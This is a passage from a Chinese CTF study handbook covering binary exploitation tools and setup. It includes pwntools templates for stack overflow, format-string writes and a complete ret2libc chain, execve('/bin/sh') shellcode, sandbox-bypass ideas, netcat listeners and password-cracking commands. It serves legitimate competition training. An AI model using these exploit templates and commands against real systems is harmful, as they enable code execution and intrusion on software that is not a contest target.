#     console.log('verify(' + a + ')=' + r);
#     return r;
#   };
# });

# 实战流程
# 1. 拿到 apk → jadx-gui 看整体逻辑、找校验函数
# 2. 需要改逻辑/去广告/绕验证 → apktool 反编译改 smali → 重打包签名
# 3. 需要动态调试 → frida hook 运行时函数（推荐）
#    或 apktool 反编译后用 smalidea（IDEA 插件）单步调 smali

# 选用建议
# 只想看源码逻辑 → jadx（GUI 一键搞定，首选）
# 要改资源/smali/重打包 → apktool
# jadx 反编译失败 → dex2jar+jd-gui 备用 / jadx --show-bad-code
# 动态分析 → frida hook（比改 smali 重打包省事）
```

***

## 五、PWN 方向

> 本方向重点推荐：★pwntools（PWN 框架，连接/打包/ROP/格式化字符串全包）｜★GDB + pwndbg（动态调试，vmmap/cyclic 利器）｜★ROPgadget（ROP gadget 查找，grep 过滤方便）
> 使用方法：pwntools → 5.5 + 独立指南 ｜ GDB + pwndbg → 独立指南 ｜ ROPgadget → 5.3
> 各相似工具组的选用逻辑见下方"工具选用建议"段落

### 5.1 工具清单

| 工具            | 用途               | 关键用法                                                                                                             | GitHub 地址                                     |
| ------------- | ---------------- | ---------------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| ★pwntools     | Python PWN 框架    | `from pwn import *remote(ip,port)`/`process()`、`p64`/`ROP`/`fmtstr_payload`→ 详见 [pwntools 指南](pwntools实战使用指南.md) | <https://github.com/Gallopsled/pwntools>      |
| ★GDB + pwndbg | 动态调试             | `gdb ./binary` → `b *0x401234` → `r`vmmap/telescope/cyclic→ 详见 [GDB+pwndbg 指南](GDB+pwndbg实战使用指南.md)                            | <https://github.com/pwndbg/pwndbg>            |
| ★ROPgadget    | ROP gadget 查找    | `ROPgadget --binary pwn \| grep "pop rdi"--rop` 自动生成 ROP chain                                                   | <https://github.com/JonathanSalwan/ROPgadget> |
| ropper        | ROP gadget 查找    | `ropper --file pwn --search "pop rdi"`支持 JS 脚本、功能更全                                                              | <https://github.com/sashs/Ropper>             |
| one\_gadget   | execve gadget 查找 | `one_gadget libc.so`找直接 getshell 的 gadget（注意约束）                                                                  | <https://github.com/david942j/one_gadget>     |
| seccomp-tools | 沙箱规则分析           | `seccomp-tools dump ./binary`看禁用了哪些系统调用（orw/沙箱题）                                                                 | <https://github.com/david942j/seccomp-tools>  |
| patchelf      | 修改 ELF           | `patchelf --set-interpreter ./ld binary--replace-needed libc.so.6 ./libc.so` 换 libc                              | <https://github.com/NixOS/patchelf>           |
| libc-database | libc 版本识别        | 本地 `./find.sh` 查 libc 版本或在线 libc.rip / libc.blukat.me                                                            | <https://github.com/niklasb/libc-database>    |

**工具选用建议**：

- PWN 框架：pwntools ★ 必装，连接/打包/ROP/格式化字符串全包，完整 API 与模板见 [pwntools 指南](pwntools实战使用指南.md)
- 动态调试：GDB + pwndbg ★ Linux PWN 标配，pwndbg 增强后寄存器/栈/反汇编一目了然，完整用法见 [GDB+pwndbg 指南](GDB+pwndbg实战使用指南.md)；Windows 程序换 x64dbg
- ROP gadget 查找：ROPgadget ★ Python 易用、grep 过滤方便，日常首选；ropper 功能更全（支持搜索语义、JS 脚本扩展），ROPgadget 找不全时换 ropper
- 直接 getshell：one\_gadget 找 libc 里直接 execve("/bin/sh") 的 gadget，省去构造 ROP 链；但每个 gadget 有约束条件（如 `rcx == NULL`），不满足会失败，需配合其他 gadget 调整寄存器
- 沙箱题：seccomp-tools dump 出规则后看允许哪些系统调用；常见 orw（open/read/write）沙箱禁了 execve，需用 ROP 调 open+read+write 读 flag
- libc 版本：泄露了 libc 函数地址后，用 libc-database 本地查或 libc.rip 在线查对应版本，算 system/bin\_sh 偏移；远程题目必须用题目给的 libc
- ELF 依赖：patchelf 替换 libc/ld 调试，本地用题目 libc 测通了再打远程

### 5.2 pwntools 基础模板

> 完整 API（连接/IO/ELF/ROP/fmtstr/shellcraft/GDB 调试）与各题型实战模板见 [pwntools 实战使用指南](pwntools实战使用指南.md)。

```python
#!/usr/bin/env python3
"""
pwntools 基础 PWN 模板
覆盖栈溢出、格式化字符串、ret2libc 等常见题型
"""

from pwn import *

# ========== 配置 ==========
context.arch = 'amd64'   # 或 'i386'
context.log_level = 'debug'

# 连接方式
# LOCAL = 远程 False, 本地 True
LOCAL = True
BINARY = './pwn'
HOST = 'challenge.ctf.com'
PORT = 9999

if LOCAL:
    p = process(BINARY)
    # gdb.attach(p, 'b *0x401234')  # 附加 GDB
else:
    p = remote(HOST, PORT)

elf = ELF(BINARY)


# ========== 辅助函数 ==========
def sla(data, line):
    p.sendlineafter(data, line)

def sa(data, payload):
    p.sendafter(data, payload)


# ========== 栈溢出模板 ==========
def stack_overflow():
    """栈溢出，覆盖返回地址"""
    offset = 72  # 通过 cyclic 或手动计算

    # ret2win：跳转到后门函数
    # win_addr = elf.symbols['win']
    # payload = b'A' * offset + p64(win_addr)

    # ROP chain
    # pop_rdi = 0x401233  # ROPgadget 找到
    # bin_sh = next(elf.search(b'/bin/sh'))
    # system = elf.plt['system']
    # payload = b'A' * offset + p64(pop_rdi) + p64(bin_sh) + p64(system)

    payload = b'A' * offset + p64(0)  # 替换为实际目标
    p.sendline(payload)
    p.interactive()


# ========== 格式化字符串模板 ==========
def format_string():
    """格式化字符串漏洞利用"""
    # 任意地址写：用 %n 写入值
    # 目标：将 target_var 的值改为 0x12345678

    # 方法1：直接写（小端序）
    # target_addr = 0x601040
    # payload = p64(target_addr) + b'%12$n'  # 偏移需调试确定

    # 方法2：pwntools fmtstr_payload
    from pwn import fmtstr_payload
    target_addr = 0x601040
    target_value = 0x12345678
    # offset: 格式化字符串在栈上的偏移
    payload = fmtstr_payload(6, {target_addr: target_value})
    p.sendline(payload)
    p.interactive()


# ========== ret2libc 模板 ==========
def ret2libc():
    """ret2libc：泄露 libc 地址后调用 system"""
    # 第一步：泄露 libc 中函数的地址
    put_got = elf.got['puts']
    put_plt = elf.plt['puts']
    main_addr = elf.symbols['main']
    pop_rdi = 0x401233  # ROPgadget --binary pwn | grep "pop rdi"

    # 泄露 puts@got
    payload = b'A' * 72
    payload += p64(pop_rdi) + p64(put_got)
    payload += p64(put_plt)
    payload += p64(main_addr)  # 返回 main 再打一次

    p.sendline(payload)
    p.recvuntil('\n')

    puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
    log.info(f"puts @ {hex(puts_addr)}")

    # 第二步：计算 libc 基址
    libc = ELF('./libc.so.6')  # 需要对应的 libc
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    log.info(f"libc base @ {hex(libc_base)}")
    log.info(f"system @ {hex(system_addr)}")

    # 第三步：再次溢出调用 system("/bin/sh")
    payload2 = b'A' * 72
    payload2 += p64(pop_rdi) + p64(bin_sh)
    payload2 += p64(system_addr)

    p.sendline(payload2)
    p.interactive()


# ========== 运行 ==========
if __name__ == "__main__":
    # 取消注释选择对应模板
    # stack_overflow()
    # format_string()
    # ret2libc()
    p.interactive()
```

### 5.3 ROP chain 构造

```bash
# 查找 ROP gadget
ROPgadget --binary pwn | grep "pop rdi"
ROPgadget --binary pwn | grep "ret"
ROPgadget --binary pwn --rop   # 自动生成 ROP chain

# 查找 one_gadget (libc 中直接 getshell 的 gadget)
one_gadget libc.so.6
# 输出示例：
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL
# 选择满足约束的 gadget，配合溢出使用
```

### 5.4 shellcode 生成

```python
#!/usr/bin/env python3
"""
shellcode 生成与测试
"""

from pwn import *

context.arch = 'amd64'  # 或 'i386', 'arm'

# 方法1：pwntools 内置 shellcode
# execve("/bin/sh")
sc = asm(shellcraft.sh())
print(f"shellcode ({len(sc)} bytes): {sc.hex()}")

# 方法2：自定义
# amd64 execve("/bin/sh") 手写版
shellcode_amd64 = """
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x68732f6e69622f  /* "/bin/sh" */
push rdi
mov rdi, rsp
mov al, 59    /* execve syscall */
syscall
"""

# 方法3：从 shell-storm.org 等获取
# http://shell-storm.org/shellcode/

# 测试 shellcode
def test_shellcode(sc):
    """在沙箱中测试 shellcode"""
    p = process('./sc_test')  # 需要一个读取并执行 shellcode 的程序
    p.send(sc)
    p.interactive()
```

### 5.5 pwntools 使用方法

> 完整 API 详解与各题型实战模板见 [pwntools 实战使用指南](pwntools实战使用指南.md)。本节为日常高频用法速查。

```python
from pwn import *

# === 1. 连接目标 ===
p = remote('1.2.3.4', 9999)                       # 远程
p = process('./pwn')                              # 本地
p = process('./pwn', env={'LD_PRELOAD':'./libc.so'})  # 指定 libc
context.log_level = 'debug'                       # 打印所有收发数据，调试必备

# === 2. 收发数据（IO）===
p.recv(1024)                                      # 收 1024 字节
p.recvuntil(b'>> ')                               # 收到 ">> " 为止（对齐菜单常用）
p.recvline()                                      # 收一行
p.sendline(b'1')                                  # 发一行（自动加 \n）
p.send(b'AAAA')                                   # 原样发
p.sendlineafter(b'>> ', b'1')                     # 等到 ">> " 再发 "1\n"
p.interactive()                                   # 拿 shell 后切交互模式

# === 3. 打包/解包（地址和整数）===
p64(0x401234)                                     # 64 位地址 → 8 字节小端
p32(0x08048456)                                   # 32 位地址 → 4 字节
u64(b'\x34\x12\x40\x00\x00\x00\x00\x00')         # 反向解包
# 注意：p64 出来是 bytes，拼接 payload 用 b'A'*n + p64(addr)

# === 4. ELF 文件分析（读本地偏移）===
elf = ELF('./pwn')
elf.symbols['main']                               # main 函数地址
elf.got['puts']                                   # puts 的 GOT 地址
elf.plt['puts']                                   # puts 的 PLT 地址
next(elf.search(b'/bin/sh'))                      # 找字符串地址

# === 5. 溢出偏移定位 ===
# 方法1：cyclic 自动算（发 cyclic(200) → 崩溃后 cyclic -l 0x6161616a 得偏移）
# 方法2：手算 padding
offset = 24
payload = b'A'*offset + p64(ret_addr)

# === 6. ROP 链构造 ===
rop = ROP(elf)
rop.puts(elf.got['puts'])                         # 调 puts 泄露 GOT
rop.main()                                        # 返回 main 再打一次
payload = b'A'*offset + rop.chain()

# 泄露 libc 后算 system / bin_sh：
libc = ELF('./libc.so.6')
libc.address = leaked_puts - libc.symbols['puts'] # 算基址
system = libc.address + libc.symbols['system']
bin_sh = libc.address + next(libc.search(b'/bin/sh'))

# === 7. 格式化字符串 ===
payload = fmtstr_payload(offset, {elf.got['printf']: system})  # 自动改 GOT
p.sendline(b'%7$p')                               # 手动泄露第 7 个栈参数

# === 8. shellcode 生成 ===
context.arch = 'amd64'                            # 先设架构
sc = asm(shellcraft.sh())                         # execve("/bin/sh")
sc = asm(shellcraft.amd64.linux.cat('/flag'))     # 读 flag

# === 9. GDB 联调 ===
p = gdb.debug('./pwn', 'b *0x401234\nc')          # 启动并下断点
gdb.attach(p, 'b main')                           # attach 到已运行进程

# === 常见题型套路 ===
# ret2text:        padding + p64(backdoor_addr)
# ret2libc:        泄露 puts → 算 libc 基址 → system("/bin/sh")
# 格式化字符串:     fmtstr_payload 改 GOT 或泄露 libc
# 栈溢出+ROP:      ROP(elf).chain() 组合多个 gadget
```

### 5.6 seccomp-tools 使用方法

```bash
# seccomp-tools：分析程序沙箱规则，看允许/禁止哪些系统调用
# 安装：gem install seccomp-tools（需 Ruby）

# 1. dump 出沙箱规则
seccomp-tools dump ./pwn
# 输出示例（orw 沙箱，禁 execve）：
#   line  CODE  JT   JF      K
#    0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#    0003: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0010
#    0004: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0010
#    0005: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0010
#    0006: 0x15 0x00 0x04 0x0000003b  if (A != execve) goto 0011
#    0007: 0x06 0x00 0x00 0x00000000  return KILL

# 2. 超时设置（题目卡输入时）
seccomp-tools dump ./pwn -c 10          # 10 秒超时
# 注：只对本地二进制有效，远程题靠交互后用 pwntools 推断

# 3. 根据规则决定攻击方式
#   禁 execve(59) 但 open/read/write 可用 → orw 读 flag
#   禁 open → 用 openat(257)
#   禁 openat → magic gadget / side channel 盲注
#   按 32 位 syscall 号判 → 切 32 位兼容模式绕过

# 4. orw 利用思路（pwntools 构造 ROP）
#   open("/flag",0) → read(fd,buf,0x100) → write(1,buf,0x100)

# 选用建议
# 沙箱题第一步：seccomp-tools dump 看规则
# 看清允许的系统调用后决定利用方式（orw / openat / side channel）
```

### 5.7 patchelf 使用方法

```bash
# patchelf：修改 ELF 的解释器和依赖库，用于本地用题目 libc 调试
# 安装：sudo apt install patchelf

# 1. 查看当前依赖
ldd ./pwn                              # 看 libc/ld 版本（系统的，可能和远程不同）
patchelf --print-interpreter ./pwn     # 看解释器（如 /lib64/ld-linux-x86-64.so.2）
patchelf --print-needed ./pwn          # 看依赖库列表

# 2. 替换解释器（ld）—— 用题目给的 ld
patchelf --set-interpreter ./ld-2.31.so ./pwn
# 3. 替换 libc —— 把 libc.so.6 指向题目给的 libc
patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn

# 4. 一条命令搞定（最常用，先复制再 patch 保留原文件）
cp ./pwn ./pwn_patched
patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc.so.6 ./pwn_patched
# 5. 验证
ldd ./pwn_patched                      # 应指向 ./libc.so.6 和 ./ld-2.31.so
./pwn_patched                          # 能正常运行说明 patch 成功

# 6. 配合 pwntools 调试
#    patch 后本地行为与远程一致，泄露偏移直接对得上
p = process('./pwn_patched')

# 选用建议
# 远程题永远用题目给的 libc——本地系统 libc 偏移和远程不同，测通了打远程也会错
# patch 顺序：先 set-interpreter（ld 要和 libc 配套），再 replace-needed
# 拿不到配套 ld 时用 pwninit 自动配：pwninit --bin ./pwn --libc ./libc.so.6
```

### 5.8 libc-database 使用方法

```bash
# libc-database：根据泄露的函数地址末位识别 libc 版本
# 安装：git clone https://github.com/niklasb/libc-database.git
#       cd libc-database && ./get            # 下载各版本 libc（耗时）

# 1. 本地查询：已知 puts 真实地址，识别 libc
#    泄露地址末 3 位（低 12 位）= 该函数在 libc 内偏移末 3 位
./find.sh puts 6f0              # 6f0 = puts 偏移末 3 位（hex）
# 输出候选：
#   ubuntu-glibc (libc6_2.31-0ubuntu9.2_amd64)

# 2. 多函数交叉验证（更准）
./find.sh puts 6f0 system 410 bin_sh 1963
# 多符号同时匹配，缩小到唯一 libc

# 3. 拿到 libc 后查其他符号偏移
./dump.sh libc6_2.31-0ubuntu9.2_amd64
#   offset_puts = 0x000086f0
#   offset_system = 0x00055410
#   str_bin_sh = 0x001b41963
# 算地址：真实 system = 泄露 puts - puts偏移 + system偏移

# 4. 在线替代（不想下数据库，覆盖更全）
#    https://libc.rip/        → 输入函数名+末位，返回 libc 与偏移
#    https://libc.blukat.me/  → 粘贴泄露地址直接算

# 5. pwntools 里用（配合 patchelf）
libc = ELF('./libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']
system = libc.address + libc.symbols['system']

# 选用建议
# 只泄露 1 个函数 → libc.rip 在线查末 3 位最快
# 泄露多个函数 → libc-database find 多符号交叉验证最准
# 拿到 libc 文件后务必 patchelf 替换，本地测通再打远程
```

***

## 六、赛前准备清单

> 参赛前一周完成本章节所有安装和脚本准备，比赛当天直接用。

### 6.1 系统环境

推荐 Kali Linux 或 Ubuntu 22.04，虚拟机分配至少 4GB 内存 + 50GB 磁盘。

```bash
# 基础环境
sudo apt update && sudo apt upgrade -y
sudo apt install -y git curl wget vim python3 python3-pip \
    build-essential libssl-dev libffi-dev ruby-dev \
    gdb gdb-multiarch file xxd strings

# Python 虚拟环境（避免污染系统）
pip3 install virtualenv
mkdir -p ~/ctf && cd ~/ctf
virtualenv venv && source venv/bin/activate
```

### 6.2 必装工具清单（按方向）

#### Web 方向

```bash
# Kali 自带的不再列出，以下为补充
sudo apt install -y sqlmap dirsearch hydra nmap

# gobuster
sudo apt install -y gobuster

# dirsearch（如 apt 没有）
git clone https://github.com/maurosoria/dirsearch.git ~/ctf/tools/dirsearch

# Burp Suite 社区版：官网下载 jar
# https://portswigger.net/burp/communitydownload

# AntSword 蚁剑
git clone https://github.com/AntSwordProject/antSword.git ~/ctf/tools/antSword

# 字典文件
sudo apt install -y seclists wordlists
ls /usr/share/seclists/Discovery/Web-Content/
ls /usr/share/wordlists/
```

#### Misc 方向

```bash
sudo apt install -y binwalk foremost exiftool steghide \
    fcrackzip john hashcat wireshark audacity \
    pngcheck zlib1g-dev

# zsteg（Ruby）
sudo gem install zsteg

# StegSolve（Java）
wget http://www.caesum.com/handbook/Stegsolve.jar -O ~/ctf/tools/Stegsolve.jar

# CyberChef 离线版
git clone https://github.com/gchq/CyberChef.git ~/ctf/tools/CyberChef

# outguess（JPEG 隐写）
sudo apt install -y outguess

# stegseek（steghide 加速破解）
sudo apt install -y stegseek
```

#### Crypto 方向

```bash
# Python 密码学库
pip3 install pycryptodome gmpy2 sympy

# SageMath（数论利器，体积大，提前装）
sudo apt install -y sagemath

# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git ~/ctf/tools/RsaCtfTool
cd ~/ctf/tools/RsaCtfTool && pip3 install -r requirements.txt

# yafu（大数分解）
sudo apt install -y yafu

# hashpump（哈希长度扩展攻击）
git clone https://github.com/bwall/HashPump.git ~/ctf/tools/HashPump
cd ~/ctf/tools/HashPump && g++ *.cpp -o hashpump -lssl -lcrypto

# xortool
pip3 install xortool

# factordb 客户端
pip3 install factordb-python
```

#### Reverse 方向

```bash
# Ghidra（开源 IDA 替代）
wget https://github.com/NationalSecurityAgency/ghidra/releases/latest -O ~/ctf/tools/ghidra.zip
unzip ~/ctf/tools/ghidra.zip -d ~/ctf/tools/

# radare2
git clone https://github.com/radareorg/radare2.git ~/ctf/tools/radare2
cd ~/ctf/tools/radare2 && sys/install.sh

# z3 约束求解
pip3 install z3-solver

# angr 符号执行
pip3 install angr

# apktool / jadx（Android 逆向）
sudo apt install -y apktool default-jdk
git clone https://github.com/skylot/jadx.git ~/ctf/tools/jadx
cd ~/ctf/tools/jadx && ./gradlew dist

# Java 环境解包
sudo apt install -y procyon-decompiler
```

#### PWN 方向

```bash
# pwntools
pip3 install pwntools

# GDB 插件 pwndbg
git clone https://github.com/pwndbg/pwndbg.git ~/ctf/tools/pwndbg
cd ~/ctf/tools/pwndbg && ./setup.sh

# ROPgadget / ropper
pip3 install ROPgadget ropper

# one_gadget（Ruby）
sudo gem install one_gadget

# seccomp-tools（Ruby）
sudo gem install seccomp-tools

# patchelf（修改 ELF 依赖）
sudo apt install -y patchelf

# pwninit（PWN 题目自动初始化）
cargo install pwninit   # 需要 Rust
# 或 pip3 install pwninit

# libc-database（本地 libc 查询）
git clone https://github.com/niklasb/libc-database.git ~/ctf/tools/libc-database
cd ~/ctf/tools/libc-database && ./download.sh
# 在线版替代：https://libc.rip/ 或 https://libc.blukat.me/
```

### 6.3 必备脚本清单

> 以下脚本位于 `cyber_security/ctf_scripts/` 目录，赛前确认可运行。

| 脚本                    | 路径                                 | 用途              | 赛前检查                                      |
| --------------------- | ---------------------------------- | --------------- | ----------------------------------------- |
| sql\_blind.py         | ctf\_scripts/sql\_blind.py         | SQL 布尔盲注二分法自动化  | `python3 sql_blind.py --help`             |
| decode\_all.py        | ctf\_scripts/decode\_all.py        | 编码批量自动识别解码      | `python3 decode_all.py "dGVzdA=="`        |
| file\_id.py           | ctf\_scripts/file\_id.py           | 文件魔数识别真实类型      | `python3 file_id.py test.png`             |
| zip\_fake\_encrypt.py | ctf\_scripts/zip\_fake\_encrypt.py | ZIP 伪加密检测与修复    | `python3 zip_fake_encrypt.py test.zip`    |
| classic\_crypto.py    | ctf\_scripts/classic\_crypto.py    | 古典密码批量解密        | `python3 classic_crypto.py caesar "test"` |
| rsa\_attacks.py       | ctf\_scripts/rsa\_attacks.py       | RSA 攻击集合        | `python3 rsa_attacks.py --help`           |
| pwn\_template.py      | ctf\_scripts/pwn\_template.py      | pwntools PWN 模板 | 检查模板中的 remote/process 切换                  |
| xor\_tool.py          | ctf\_scripts/xor\_tool.py          | XOR 加解密与爆破      | `python3 xor_tool.py auto "cipher.txt"`   |

```bash
# 赛前一键测试所有脚本
cd ~/ai_blog/cyber_security/ctf_scripts/
for script in *.py; do
    echo "===== $script ====="
    python3 "$script" --help 2>&1 | head -5
    echo
done
```

### 6.4 必备模板文件

赛前在 `~/ctf/templates/` 准备以下模板，比赛时复制即用。

#### 6.4.1 PWN exp 模板

```python
#!/usr/bin/env python3
# ~/ctf/templates/pwn_exp.py
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

# ===== 模式切换 =====
# 本地:  python3 exp.py
# 远程:  python3 exp.py REMOTE <ip> <port>
# GDB:   python3 exp.py GDB
def start():
    if args.GDB:
        return gdb.debug('./pwn', gdbscript='''
            b main
            continue
        ''')
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process('./pwn')

io = start()
elf = ELF('./pwn')
# libc = ELF('./libc.so.6')

# ===== 求偏移 =====
# io.sendline(cyclic(500))
# crash 后用 cyclic_find(corefile.pc) 或 cyclic_find(corefile.read(sp, 4))

# ===== 构造 payload =====
# payload = b'A' * offset + p64(ret_addr)
# io.sendline(payload)

io.interactive()
```

#### 6.4.2 Web 请求模板

```python
#!/usr/bin/env python3
# ~/ctf/templates/web_req.py
import requests

url = "http://target.com/"
headers = {"User-Agent": "Mozilla/5.0"}
cookies = {"session": "xxx"}

# 基础请求
r = requests.get(url, headers=headers, cookies=cookies, timeout=10)
print(r.status_code, r.text[:500])

# POST 请求
# r = requests.post(url, data={"key": "value"}, headers=headers)

# 带代理（配合 Burp）
# proxies = {"http": "http://127.0.0.1:8080"}
# r = requests.get(url, proxies=proxies, verify=False)
```

#### 6.4.3 编解码工具箱模板

```python
#!/usr/bin/env python3
# ~/ctf/templates/codec.py
import base64, binascii, urllib.parse, codecs

def try_decode(s):
    """自动尝试多种解码"""
    results = []
    try: results.append(("base64", base64.b64decode(s).decode(errors='ignore')))
    except: pass
    try: results.append(("base32", base64.b32decode(s).decode(errors='ignore')))
    except: pass
    try: results.append(("hex", bytes.fromhex(s).decode(errors='ignore')))
    except: pass
    try: results.append(("url", urllib.parse.unquote(s)))
    except: pass
    try: results.append(("rot13", codecs.decode(s, 'rot_13')))
    except: pass
    return results

if __name__ == "__main__":
    import sys
    s = sys.argv[1] if len(sys.argv) > 1 else input("输入: ")
    for name, result in try_decode(s):
        if result and result != s:
            print(f"[{name}] {result}")
```

### 6.5 赛前检查清单

比赛前一天逐项确认：

```
[ ] 虚拟机快照已保存（随时可回滚）
[ ] Python 虚拟环境可用，pwntools 导入正常
[ ] Burp Suite 证书已安装，代理可抓包
[ ] GDB + pwndbg 启动正常（gdb ./test 能看寄存器）
[ ] ROPgadget / one_gadget 命令可用
[ ] binwalk -e / foremost 可提取文件
[ ] zsteg / stegsolve 可打开图片
[ ] Wireshark 可打开 pcap，过滤规则正常
[ ] SageMath 可启动（sage 命令）
[ ] RsaCtfTool 可运行（python3 RsaCtfTool.py -h）
[ ] dirsearch / gobuster 字典文件就位
[ ] ctf_scripts/ 下所有脚本 --help 正常
[ ] ~/ctf/templates/ 模板文件就绪
[ ] 网络稳定，VPN/代理配置好
[ ] 浏览器书签：CTF Wiki / CyberChef / factordb / libc.rip
[ ] 记事本工具就绪（Obsidian / Typora）用于记录 Writeup
[ ] 团队协作工具就绪（如多人参赛）
[ ] 常用 payload 字典就绪（flag 格式、SQL 注入、XSS、SSTI）
```

### 6.6 浏览器书签准备

赛前在浏览器收藏以下在线工具：

```
分类          网址                              用途
CTF Wiki     https://ctf-wiki.org/             知识查阅
CyberChef    https://gchq.github.io/CyberChef/ 编解码瑞士军刀
factordb     https://factordb.com/             在线因数分解
libc.rip     https://libc.rip/                 libc 版本查询
libc.blukat  https://libc.blukat.me/           libc 函数偏移查询
quipqiup     https://www.quipqiup.com/         替换密码自动破解
dcode        https://www.dcode.fr/             各种密码/编码识别
myjson       https://jwt.io/                   JWT 解码
ASCII表      https://www.asciitable.com/       ASCII 对照
URL编码      https://www.urlencoder.org/       URL 编解码
Base64       https://www.base64decode.org/     Base64 编解码
正则可视化    https://regex101.com/             正则测试
```

### 6.7 团队分工模板（如多人参赛）

```
方向          负责人    主要工具
Web           A        Burp Suite, sqlmap, dirsearch
Misc          B        Wireshark, binwalk, StegSolve
Crypto        C        SageMath, RsaCtfTool, CyberChef
Reverse/PWN   D        IDA/Ghidra, pwntools, GDB
通用支持      E        搜索资料、整理 Writeup、提交 Flag
```

***

## 七、通用工具与技巧

### 7.1 Python 快捷操作

```python
# bytes ↔ int
b'\x12\x34' → int.from_bytes(b'\x12\x34', 'big')  # 0x1234
0x1234 → 0x1234.to_bytes(2, 'big')                  # b'\x12\x34'

# bytes ↔ hex string
b'\xde\xad' → b'\xde\xad'.hex()      # 'dead'
'dead' → bytes.fromhex('dead')         # b'\xde\xad'

# bytes ↔ base64
import base64
b'hello' → base64.b64encode(b'hello')  # b'aGVsbG8='
b'aGVsbG8=' → base64.b64decode(b'aGVsbG8=')  # b'hello'

# XOR
def xor(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

# pwntools 常用
from pwn import *
p64(0x41414141)   # 打包为 8 字节小端序
u64(b'\x41\x41\x41\x41\x00\x00\x00\x00')  # 解包
p32(0x41414141)   # 打包为 4 字节
```

### 7.2 一行命令速查

```bash
# 编解码
echo -n "hello" | base64              # Base64 编码
echo "aGVsbG8=" | base64 -d           # Base64 解码
echo -n "hello" | xxd -p              # 转 Hex
echo "68656c6c6f" | xxd -r -p         # Hex 转字符串
echo -n "hello" | md5sum              # MD5
echo -n "hello" | sha256sum           # SHA256

# 文件操作
xxd file | head -20                   # 十六进制查看
strings file | grep -i flag           # 提取含 flag 的字符串
file file                             # 文件类型
binwalk -e file                       # 提取隐藏文件
foremost -i file -o output/           # 文件恢复

# 网络操作
nc -lvnp 4444                         # 监听端口
nc target 4444                        # 连接目标
curl http://target/flag               # HTTP 请求
nmap -sV -p 1-65535 target           # 端口扫描

# Python 一行
python3 -c "import base64; print(base64.b64decode('aGVsbG8=').decode())"
python3 -c "print(bytes.fromhex('68656c6c6f').decode())"
python3 -c "from pwn import *; print(p64(0x41414141))"

# 密码破解
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 7.3 环境快速部署

```bash
# Kali Linux 基础工具安装
sudo apt update && sudo apt install -y \
    gdb gdb-multiarch \
    python3-pip \
    binwalk foremost \
    wireshark \
    hashcat john \
    nmap \
    sqlmap \
    hydra \
    fcrackzip \
    exiftool

# Python PWN 工具
pip3 install pwntools z3-solver angr gmpy2 pycryptodome

# ROPgadget
pip3 install ROPgadget

# seccomp-tools
gem install seccomp-tools

# zsteg (PNG 隐写)
gem install zsteg

# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool && pip3 install -r requirements.txt
```

